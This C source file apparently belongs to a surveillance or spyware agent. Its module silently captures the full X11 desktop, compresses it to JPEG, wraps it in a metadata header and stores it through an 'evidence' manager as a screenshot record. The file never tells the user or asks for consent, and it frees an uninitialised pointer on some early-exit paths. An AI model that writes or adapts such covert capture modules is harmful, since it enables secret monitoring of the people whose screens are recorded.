#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <X11/Xutil.h>
#include <jpeglib.h>
#include <openssl/bio.h>
#include <string.h>

#include "module.h"
#include "evidencemanager.h"

struct additional {
   unsigned int version;
   unsigned int processlen;
   unsigned int windowlen;
   char window[16];
} __attribute__((packed));

void *module_screenshot_start(void *args)
{
   Display *display = NULL;
   int screen;
   Window window;
   XWindowAttributes wininfo;
   XImage *image = NULL;

   unsigned long pixel;
   int x, y;
   char *buffer;
   struct jpeg_compress_struct cinfo;
   struct jpeg_error_mgr jerr;
   JSAMPROW row;
   unsigned char *outbuf = NULL;
   unsigned long int outlen = 0;

   BIO *bio_additional = NULL, *bio_data = NULL;
   int additionallen, datalen;
   char *additionalptr, *dataptr;
   struct additional a;
   
   printf("Running module SCREENSHOT\n");

   if(modulelist[MODULE_SCREENSHOT_INDEX].status == MODULE_STARTING) modulelist[MODULE_SCREENSHOT_INDEX].status = MODULE_STARTED;

   do {
      if((display = XOpenDisplay(":0.0")) == NULL) break;
      screen = DefaultScreen(display);   
      window = RootWindow(display, screen);
      if(!XGetWindowAttributes(display, window, &wininfo)) break;
      if(!(image = XGetImage(display, window, wininfo.x, wininfo.y, wininfo.width, wininfo.height, AllPlanes, ZPixmap))) break;
      if(image->depth != 24) break;

      buffer = malloc(3 * image->width * image->height);
      for(y = 0; y < image->height; y++) {
         for(x = 0; x < image->width; x++) {
            pixel = XGetPixel(image, x, y);
            buffer[y * image->width * 3 + x * 3 + 0] = (char)(pixel>>16);
            buffer[y * image->width * 3 + x * 3 + 1] = (char)((pixel>>8) & 0xff);
            buffer[y * image->width * 3 + x * 3 + 2] = (char)(pixel & 0xff);
         }
      }

      cinfo.err = jpeg_std_error(&jerr);
      jpeg_create_compress(&cinfo);
      jpeg_mem_dest(&cinfo, &outbuf, &outlen);

      cinfo.image_width = image->width;
      cinfo.image_height = image->height;
      cinfo.input_components = 3;
      cinfo.in_color_space = JCS_RGB;

      jpeg_set_defaults(&cinfo);
      jpeg_set_quality(&cinfo, 75, TRUE);
      jpeg_start_compress(&cinfo, TRUE);

      while(cinfo.next_scanline < cinfo.image_height) {
         row = (JSAMPROW)&buffer[cinfo.next_scanline * 3 * image->width];
         jpeg_write_scanlines(&cinfo, &row, 1);
      }
      jpeg_finish_compress(&cinfo);
      jpeg_destroy_compress(&cinfo);

      bio_additional = BIO_new(BIO_s_mem());
      bio_data = BIO_new(BIO_s_mem());

      a.version = 2009031201;
      a.windowlen = 16;
      a.processlen = 0;
      memcpy(a.window, "D\0e\0s\0k\0t\0o\0p\0\0\0", sizeof(a.window));

      BIO_write(bio_additional, &a, sizeof(a));

      BIO_write(bio_data, outbuf, outlen);

      BIO_flush(bio_additional);
      BIO_flush(bio_data);

      additionallen = BIO_get_mem_data(bio_additional, &additionalptr);
      datalen = BIO_get_mem_data(bio_data, &dataptr);

      evidence_write(EVIDENCE_TYPE_SCREENSHOT, additionalptr, additionallen, dataptr, datalen);
   } while(0); 

   if(outbuf) free(outbuf);
   if(buffer) free(buffer);
   if(image) XDestroyImage(image);
   if(display) XCloseDisplay(display);

   modulelist[MODULE_SCREENSHOT_INDEX].status = MODULE_STOPPED;

   return NULL;
}
